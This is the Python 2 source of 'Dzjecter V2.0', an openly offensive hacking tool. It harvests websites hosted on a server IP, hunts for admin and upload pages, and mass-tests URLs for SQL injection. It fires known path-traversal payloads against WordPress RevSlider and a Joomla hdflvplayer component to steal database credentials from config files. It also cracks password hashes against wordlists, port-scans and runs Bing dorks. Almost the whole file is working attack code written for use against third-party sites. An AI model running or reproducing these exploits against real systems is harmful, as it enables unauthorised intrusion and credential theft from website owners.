#!/usr/bin/env python
#coding: utf-8

#############
#Dzjecter V2.0
#############

__author__ = "Yacine_Mohamed/Joker_Security"
__version__ = "2.0"


import urllib
import urllib2
from urlparse import urlparse
import re
import os
import socket
import hashlib
import httplib
import time
from bs4 import BeautifulSoup
from platform import system
from base64 import b64encode , b64decode
import sys
import string
import random

def banner():
	print '''
                                       .--.
                                     .' ,--.`.
                                   ,' ,'    `|
                                ,'  ,'      '                         
                              ,'   '
                            ,'    '
                         _,-    ,'   \033[96m
                      _,'       |                           ____,-------.
                   _,'           `.                   _,---'   ___,----. `.   
                _,'             _,---.             ,-'      ,-'         `.|    
             _,'            _,-'  _   `.        ,' __     ,'             |'    
           ,'   .--.    _,-'__,--' `.   `.   ,'_,-'  `. ,'              ,'     
        ,'  , '    `. ,'_,-'        `.    .,'-'-.      `.                      
      ,', '         ,','   DZJECTER   `.          `-. `. `.                     
    ,','          ,''`)`.    V2.0    ,`.         `.  `.`-.`. 
   ,,'           ((  '   `.        ,'     _,-=-.  `\  `\ |`.\  \033[92m 
  ' (             ``       `.    ,'     ,'-,'  `.  `)  `)`  )) 
 (   `                       ` .'     ,'-,'     |  ,;   ;   '' 
  `                           `:     |---|      `.     ,'
                               :     |---|       '.    :
                               :     `.--`.       '.   : 
                               `      `    `       ',`__)
                             >>> Bism Allah <<< \033[91m
                       Script Name : DZJECTER V 2.0 \033[92m
                 Developed By : Joker-Security / Yacine Mohamed \033[96m
                        website : http://dev-labs.co \033[91m             
'''
def options():
	print """
\033[91m 1 \033[92m)\033[96m Get All Websites
\033[91m 2 \033[92m)\033[96m Get Wordpress Websites
\033[91m 3 \033[92m)\033[96m Get Joomla Websites
\033[91m 4 \033[92m)\033[96m Get Config [Wordpress]
\033[91m 5 \033[92m)\033[96m Get Config [Joomla]
\033[91m 6 \033[92m)\033[96m Find Admin Panel
\033[91m 7 \033[92m)\033[96m Upload Shell 
\033[91m 8 \033[92m)\033[96m Sql Scanner
\033[91m 9 \033[92m)\033[96m Base64 Encode
\033[91m 10\033[92m)\033[96m Port Scanner
\033[91m 11\033[92m)\033[96m Hash Encode/Decode
\033[91m 12\033[92m)\033[96m IP Lookup
\033[91m 13\033[92m)\033[96m Bing Dorker
\033[91m 14\033[92m)\033[96m About !!!
\033[91m 15\033[92m)\033[96m Exit !!!
"""
def clear():
    if system() == 'Linux':
        os.system("clear")
    if system() == 'Windows':
        os.system('cls')
        os.system('color a')
    else:
        pass
def ext():
    ex = raw_input ('\033[92mContinue/Exit [C/E] -> ')
    if ex[0].upper() == 'E' :
           print 'Exiting!!!'
           exit()
    else:
           clear()
           banner()
           options()
           main()
def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(4. / 100)
def sql(srvip  ):
 srv= srvip
 start=1
 end=101
 while start<=end :
     try:
       bng = urllib.urlretrieve('http://www.bing.com/search?q=ip%3A'+srv+"+php?id=&count=50&first="+str(start))
       bngg = open(bng[0])
       rdd=bngg.read()
       find=re.findall('<h2><a href="(.*?)"',rdd)
       start = start+50
     except IOError:
       print "[->] Network Error [<-]"
     try :
       for i in range(len(find)):
               rez=find[i]+"'"
               tst = urllib.urlretrieve(rez)
               tstf = open(tst[0])
               tstdd= tstf.read()
               tstfind=re.findall('/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch_row()|SELECT * FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error/i|You have an error in your SQL syntax|Microsoft VBScript runtime error',tstdd)
               if(tstfind):
                 print "[Injectable] -> "+ rez 
     except:
     	pass
def unique(seq):
	chf = set()
	return [chf.add(Y) or Y for Y in seq if Y not in chf]
def srvaf(ip):
	pg = 1
	ipsrv = ip
	wbs = []
	while pg <= 101:
		try:
			bng = "http://www.bing.com/search?q=ip%3A" + ipsrv + "+&count=50&first=" + str(pg)
			obng = urllib2.urlopen(bng)
			rbng = obng.read()
			fwbs = re.findall('<h2><a href="(.*?)"', rbng)
			for i in range(len(fwbs)):
				alcls = fwbs[i]
				findal = re.findall('http://(.*?)/', alcls)
				for xdd, itt in enumerate(findal):
					if 'www' not in itt:
						findal[xdd] = 'http://www.' + itt + '/'
					else:
						findal[xdd] = 'http://' + itt + '/'
				wbs.extend(findal)
			pg += 50
		except urllib2.URLError:
			pass
	wbss = unique(wbs)
	adm = ['admin/login.php', 'admin/' , 'cp/' , '_admin/' , 'panel/' , 'admin/login.php']
	for site in wbss :
		for admn in adm :
			if urllib.urlopen(site + admn).getcode() == 200:
				print "[+] Found -> ", site + admn
			else:
				print "[-] Not_Found -> ", site + admn

def srvup(ip):
	pg = 1
	ipsrv = ip
	wbs = []
	while pg <= 101:
		try:
			bng = "http://www.bing.com/search?q=ip%3A" + ipsrv + "+&count=50&first=" + str(pg)
			obng = urllib2.urlopen(bng)
			rbng = obng.read()
			fwbs = re.findall('<h2><a href="(.*?)"', rbng)
			for i in range(len(fwbs)):
				alcls = fwbs[i]
				findal = re.findall('http://(.*?)/', alcls)
				for xdd, itt in enumerate(findal):
					if 'www' not in itt:
						findal[xdd] = 'http://www.' + itt + '/'
					else:
						findal[xdd] = 'http://' + itt + '/'
				wbs.extend(findal)
			pg += 50
		except urllib2.URLError:
			pass
	wbss = unique(wbs)
	adm = ['up.php' , 'upload.php' , 'file_upload.php', 'admin/up.php' , 'admin/upload.php' , 'admin/file_upload.php']
	for site in wbss :
		for admn in adm :
			if urllib.urlopen(site + admn).getcode() == 200:
				print "[+] Found -> ", site + admn
			else:
				print "[-] Not_Found -> ", site + admn
def getall(ip):
	pg = 1
	ipsrv = ip
	wbs = []
	while pg <= 101:
		try:
			bng = "http://www.bing.com/search?q=ip%3A" + ipsrv + "+&count=50&first=" + str(pg)
			obng = urllib2.urlopen(bng)
			rbng = obng.read()
			fwbs = re.findall('<h2><a href="(.*?)"', rbng)
			for i in range(len(fwbs)):
				alcls = fwbs[i]
				findal = re.findall('http://(.*?)/', alcls)
				for xdd, itt in enumerate(findal):
					if 'www' not in itt:
						findal[xdd] = 'http://www.' + itt + '/'
					else:
						findal[xdd] = 'http://' + itt + '/'
				wbs.extend(findal)
			pg += 50
		except urllib2.URLError:
			pass
	wbss = unique(wbs)
	for site in wbss:
		print site
def getwp(ip):
	pg = 1
	ipsrv = ip
	wbs = []
	while pg <= 101:
		try:
			bng = "http://www.bing.com/search?q=ip%3A" + ipsrv + "+?page_id=&count=50&first=" + str(pg)
			obng = urllib2.urlopen(bng)
			rbng = obng.read()
			fwbs = re.findall('<h2><a href="(.*?)"', rbng)
			for i in range(len(fwbs)):
				wpcls = fwbs[i]
				findwp = re.findall('(.*?)\?page_id=', wpcls)
				wbs.extend(findwp)
			pg += 50
		except:
			pass
	wbs = unique(wbs)
	for site in wbs:
		print site
def getjm(ip):
	pg = 1
	ipsrv = ip
	wbs = []
	while pg <= 101:
		try:
			bng = "http://www.bing.com/search?q=ip%3A" + ipsrv + "+index.php?option=com&count=50&first=" + str(pg)
			obng = urllib2.urlopen(bng)
			rbng = obng.read()
			fwbs = re.findall('<h2><a href="(.*?)"', rbng)
			for i in range(len(fwbs)):
				wpcls = fwbs[i]
				findwp = re.findall('(.*?)index.php', wpcls)
				wbs.extend(findwp)
			pg += 50
		except:
			pass
	wbs = unique(wbs)
	for site in wbs:
		print site
def prtscan(ip):
    port = "http://api.hackertarget.com/nmap/?q=" + ip
    pport = urllib.urlopen(port).read()
    print (pport)
    ext()
def bsed():
    slowprint("\033[92m 1) \033[91mEncode")
    slowprint("\033[92m 2) \033[93mDecode")
    def bsencode():
      js = raw_input("Enter Your Text To Encode -> ")
      b = b64encode(js.encode("utf-8"))
      d = b.decode('utf-8')
      print d
      ext()
    def bsdecode():
      js = raw_input("Enter Base64 To Decode -> ")
      s = b64decode(js.decode("utf-8"))
      print s
      ext()
    bs = raw_input("Enter 1/2 -> ")
    if bs == "1":
      bsencode()
    elif bs == "2":
      bsdecode()
def HashMain():
    clear()
    print '''
1 >> MD5 Encode
2 >> MD5 Decode
3 >> SHA1 Encode
4 >> SHA1 Decode
5 >> SHA256 Encode
6 >> SHA256 Decode
7 >> SHA384 Encode
8 >> SHA384 Decode
9 >> SHA512 Encode
10 >> SHA512 Decode
11 >> Joomla Hash Encode
12 >> Joomla Hash Decode
'''
def StartHash():
  yacine = raw_input('Enter Your Choice -> ')
  if yacine == '1':
    md5()
  elif yacine == '2':
    md5d()
  elif yacine == '3':
    sha1()
  elif yacine == '4':
    sha1d()
  elif yacine == '5':
    sha256()
  elif yacine == '6':
    sha256d()
  elif yacine == '7':
    sha384()
  elif yacine == '8':
    sha384d()
  elif yacine == '9':
    sha512()
  elif yacine == '10':
    sha512d()
  elif yacine == '11':
    jme()
  elif yacine == '12':
    jmd()
def md5():
  clear()
  hsh = raw_input ('Enter Your Text To Encode MD5 -> \033[0;32m')
  ho = hashlib.md5(hsh.encode())
  print '*' * 100
  print ho.hexdigest()
  print '*' * 100
  ext()
def md5d():
  clear()
  hsh = raw_input('Enter Your Hash To Decode MD5 -> \033[0;32m')
  wl = raw_input('Wordlist Path -> \033[94m')
  pss = open(wl,'r')
  rd = pss.readlines()
  print "[+]----------------------------------------------[+]"
  print "| %s Password Founded In Wordlist!!" % len(rd)
  print "| Wait Cracking ..."
  print "[+]----------------------------------------------[+]","\n"
  for i in rd:
          i = i.strip('\n')
          ho = hashlib.md5(i.encode())
          hsh1 = ho.hexdigest()
          if hsh == hsh1:
              print "\033[92m[+]-------------------------------------------------------------------------------------------[+]"
              print "|",'[+]',hsh + " -> " , i + " = True Mabroook!!"
              print "[+]-------------------------------------------------------------------------------------------[+]"
              break
          else:
              print "\033[91m[-]-------------------------------------------------------------------------------------------[-]"
              print '|','[-]',hsh + " -> " , i + " = False :("
              print "[-]-------------------------------------------------------------------------------------------[-]"
  ext()
def sha1():
    clear()
    hsh = raw_input('Enter Your Text To Encode SHA1 -> \033[0;32m')
    ho = hashlib.sha1(hsh.encode())
    print '*' * 100
    print ho.hexdigest()
    print '*' * 100
    ext()
def sha1d():
    clear()
    hsh = raw_input('Enter Your Hash To Decode SHA1 -> \033[0;32m')
    wl = raw_input('Wordlist Path -> \033[94m')
    pss = open(wl,'r')
    rd = pss.readlines()
    print "[+]----------------------------------------------[+]"
    print "| %s Password Founded In Wordlist!!" % len(rd)
    print "| Wait Cracking ..."
    print "[+]----------------------------------------------[+]","\n"
    for i in rd:
            i = i.strip('\n')
            ho = hashlib.sha1(i.encode())
            hsh1 = ho.hexdigest()
            if hsh == hsh1:
                print "\033[92m[+]-------------------------------------------------------------------------------------------[+]"
                print "|",'[+]',hsh + " -> " , i + " = True Mabroook!!"
                print "[+]-------------------------------------------------------------------------------------------[+]"
                break
            else:
                print "\033[91m[-]-------------------------------------------------------------------------------------------[-]"
                print '|','[-]',hsh + " -> " , i + " = False :("
                print "[-]-------------------------------------------------------------------------------------------[-]"
    ext()
def sha256():
    clear()
    hsh = raw_input('Enter Your Text To Encode SHA256 -> \033[0;32m')
    ho = hashlib.sha256(hsh.encode())
    print '*' * 100
    print ho.hexdigest()
    print '*' * 100
    ext()

def sha256d():
    clear()
    hsh = raw_input('Enter Your Hash To Decode SHA256 -> \033[0;32m')
    wl = raw_input('Wordlist Path -> \033[94m')
    pss = open(wl,'r')
    rd = pss.readlines()
    print "[+]----------------------------------------------[+]"
    print "| %s Password Founded In Wordlist!!" % len(rd)
    print "| Wait Cracking ..."
    print "[+]----------------------------------------------[+]","\n"
    for i in rd:
            i = i.strip('\n')
            ho = hashlib.sha256(i.encode())
            hsh1 = ho.hexdigest()
            if hsh == hsh1:
                print "\033[92m[+]-------------------------------------------------------------------------------------------[+]"
                print "|",'[+]',hsh + " -> " , i + " = True Mabroook!!"
                print "[+]-------------------------------------------------------------------------------------------[+]"
                break
            else:
                print "\033[91m[-]-------------------------------------------------------------------------------------------[-]"
                print '|','[-]',hsh + " -> " , i + " = False :("
                print "[-]-------------------------------------------------------------------------------------------[-]"
    ext()
def sha384():
    clear()
    hsh = raw_input('Enter Your Text To Encode SHA384 -> \033[0;32m')
    ho = hashlib.sha384(hsh.encode())
    print '*' * 100
    print ho.hexdigest()
    print '*' * 100
    ext()
def sha384d():
    clear()
    hsh = raw_input('Enter Your Hash To Decode SHA384 -> \033[0;32m')
    wl = raw_input('Wordlist Path -> \033[94m')
    pss = open(wl,'r')
    rd = pss.readlines()
    print "[+]----------------------------------------------[+]"
    print "| %s Password Founded In Wordlist!!" % len(rd)
    print "| Wait Cracking ..."
    print "[+]----------------------------------------------[+]","\n"
    for i in rd:
            i = i.strip('\n')
            ho = hashlib.sha384(i.encode())
            hsh1 = ho.hexdigest()
            if hsh == hsh1:
               print "\033[92m[+]-------------------------------------------------------------------------------------------[+]"
               print '|','[+]',hsh + " -> " , i + " = True Mabroook!!"
               print "[+]-------------------------------------------------------------------------------------------[+]"
               break
            else:
                print "\033[91m[-]-------------------------------------------------------------------------------------------[-]"
                print '|','[-]',hsh + " -> " , i + " = False :("
                print "[-]-------------------------------------------------------------------------------------------[-]"
    ext()
def sha512():                       
    clear()
    hsh = raw_input('Enter Your Text To Encode SHA512 -> \033[0;32m')
    ho = hashlib.sha512(hsh.encode())
    print '*' * 100
    print ho.hexdigest()
    print '*' * 100
    ext()
def sha512d():
    clear()
    hsh = raw_input('Enter Your Hash To Decode SHA512 -> \033[0;32m')
    wl = raw_input('Wordlist Path -> \033[94m')
    pss = open(wl,'r')
    rd = pss.readlines()
    print "[+]----------------------------------------------[+]"
    print "| %s Password Founded In Wordlist!!" % len(rd)
    print "| Wait Cracking ..."
    print "[+]----------------------------------------------[+]","\n"
    for i in rd:
            i = i.strip('\n')
            ho = hashlib.sha512(i.encode())
            hsh1 = ho.hexdigest()
            if hsh == hsh1:
                print "\033[92m[+]-------------------------------------------------------------------------------------------[+]"
                print "|",'[+]',hsh + " -> " , i + " = True Mabroook!!"
                print "[+]-------------------------------------------------------------------------------------------[+]"
                break
            else:
                print "\033[91m[-]-------------------------------------------------------------------------------------------[-]"
                print '|','[-]',hsh + " -> " , i + " = False :("
                print "[-]-------------------------------------------------------------------------------------------[-]"
    ext()
def jme():
    clear()
    hsh = raw_input('Enter Your Text To Encode Joomla_Hash -> \033[0;32m')
    st = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for x in range(32))
    hsh1 = hashlib.md5(hsh + st).hexdigest()
    print '*' * 100
    print hsh1+ ':' + st
    print '*' * 100
    ext()
def jmd():
    clear()
    hsh = raw_input("Enter Your Hash To Decode Joomla_Hash -> \033[0;32m").split(':')
    wl = raw_input("Wordlist Path -> \033[94m")
    md5 = hsh[0]
    st = hsh[1]
    pl = open(wl).readlines()
    print "[+]----------------------------------------------[+]"
    print "| %s Password Founded In Wordlist!!" % len(pl)
    print "| Wait Cracking ..."
    print "[+]----------------------------------------------[+]","\n"
    for ln in pl:
          ln = ln.strip()
          at = hashlib.md5(ln + st).hexdigest()
          if(at == md5):
            print "\033[92m[+]-------------------------------------------------------------------------------------------[+]"
            print '|','[+]',md5 + ':' + st + ' -> ' + ln + ' = True Mabroook!!'
            print "[+]-------------------------------------------------------------------------------------------[+]"
            break
          else:
            print "\033[91m[-]-------------------------------------------------------------------------------------------[-]"
            print '|','[-]',md5 + ':' + st + ' -> ' + ln + ' = False :('
            print "[-]-------------------------------------------------------------------------------------------[-]"
    ext()
def ipl():
    url = 'http://api.hackertarget.com/reverseiplookup/?q='
    lista = raw_input(" Enter List : ")
    lista = open(lista,'r')
    read = lista.readlines()
    for ip in read:
    	ip = ip.rstrip("\n")
        print("Scanning -> "+ip)
        curl = url+ip
        openurl = urllib2.urlopen(curl)
        read = openurl.read()
        file = open('site.txt','a')
        file.write(read)
        file.close()
        print(" [ + ] Found -> "+read)
def bd():
 try :
    dork  = raw_input('Enter Your Dork -> ')
    code  = urllib.urlencode({'?q':dork})
    page  = 1
    sites = list()
    while page <= 50 :
      
      url   = "http://www.bing.com/search"+code+"&first="+str(page)
      req   = urllib2.Request(url)
      opreq = urllib2.urlopen(req).read()
      findurl = re.findall('<div class="b_title"><h2><a href="(.*?)" h=',opreq)
      
      for url in findurl :
                             split = urlparse(url)
                             site   = split.netloc
                             if site not in sites :
                                      print site 
                                      sites.append(site)
      page +=1

 except Exception as ex :
        print "Invalid Ip / Not found Websites"
        pass
def abt():
	print "Script Name : Dzjecter " + __version__ + "\033[91m"
	print "Script by: " + __author__ + "\033[96m"
	print "website : http://dev-labs.co \033[96m"
	print "facebook Page : http://facebook.com/kali.linux.pentesting.tutorials \033[96m "
def getcnfwp(fn):
    payload = "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"
    try:
       fn = open(fn, "r")
    except:
       print ("Noob Enter List Sites *_*")
    for dmn in fn:
       dmn = dmn.rstrip()
       try:
           if dmn[:7] == "http://":
            dmn = dmn.replace("http://", "")
           if dmn[:8] == "https://":
            dmn = dmn.replace("https://", "")
           if dmn[-1] == "/":
            dmn = dmn.replace("/", "")
           cwp = httplib.HTTPConnection(dmn)
           cwp.request("POST", payload)
           cwp = cwp.getresponse()
           fwp = cwp.read()
           if cwp.status == 200 and ("DB_USER" and "DB_PASSWORD" and "DB_HOST") in fwp:
               print ("\033[0;32m Config Found -> "), dmn + payload
               with open("WP_Config.txt", "a") as fnn:
                   fnn.writelines(dmn + payload + "\n")
               print "\033[0;32m Saved In WP_Config.txt"
           else:
               print("\033[91m Not Found Config -> "), dmn
       except:
           pass
def getcnfjm(fn):
    payload = "/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php"
    try:
       fn = open(fn, "r")
    except:
       print ("Noob Enter List Sites *_*")
    for dmn in fn:
       dmn = dmn.rstrip()
       try:
           if dmn[:7] == "http://":
            dmn = dmn.replace("http://", "")
           if dmn[:8] == "https://":
            dmn = dmn.replace("https://", "")
           if dmn[-1] == "/":
            dmn = dmn.replace("/", "")
           cwp = httplib.HTTPConnection(dmn)
           cwp.request("POST", payload)
           cwp = cwp.getresponse()
           fwp = cwp.read()
           if cwp.status == 200 and ("$user" and "$host" and "$password") in fwp:
               print ("\033[0;32m Config Found -> "), dmn + payload
               with open("JM_Config.txt", "a") as fnn:
                   fnn.writelines(dmn + payload + "\n")
               print "\033[0;32m Saved In JM_Config.txt"
           else:
               print("\033[91m Not Found Config -> "), dmn
       except:
           pass
def main():
	clear()
	banner()
	options()
	dz = raw_input("\033[91mroot@Dzjecter:~# ")
	if dz == "1":
		svrip = raw_input("\033[91mServer IP -> ")
		getall(svrip)
		ext()
	elif dz == "2":
		srvip = raw_input("\033[91mServer IP -> ")
		getwp(srvip)
		ext()
	elif dz == "3":
		svrip = raw_input("\033[96mServer IP -> ")
		getjm(svrip)
		ext()
	elif dz == "4":
		fn = raw_input("Entre List Sites -> ")
		getcnfwp(fn)
	elif dz == "5":
		fn = raw_input("Entre List Sites -> ")
		getcnfjm(fn)
	elif dz == "6":
		svrip=raw_input("\033[91mServer IP -> ")
		srvaf(svrip)
		ext()
	elif dz == "7":
		svrip=raw_input("\033[91mServer IP -> ")
		srvup(svrip)
		ext()
	elif dz == "8":
		sqli = raw_input("\033[96mServer IP -> ")
		sql(sqli)
		ext()
	elif dz == "9":
		bsed()
	elif dz == "10":
		domip = raw_input('\033[1;91mServer Ip -> \033[1;m')
		prtscan(domip)
	elif dz == "11":
		HashMain()
		StartHash()
	elif dz == "12":
		clear()
		ipl()
		ext()
	elif dz == "13":
		bd()
		ext()
	elif dz == "14":
		abt()
		ext()
	elif dz == "15":
		exit()
if __name__ == "__main__":
	main()